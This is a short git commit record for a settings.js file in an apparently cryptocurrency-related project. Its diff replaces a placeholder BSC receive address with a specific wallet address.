cb605b7be7b0996aeab8efc2a617389b4dca29d1
CBears <dev@cashbears.online>
2022-06-25 02:16:22 -0700

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
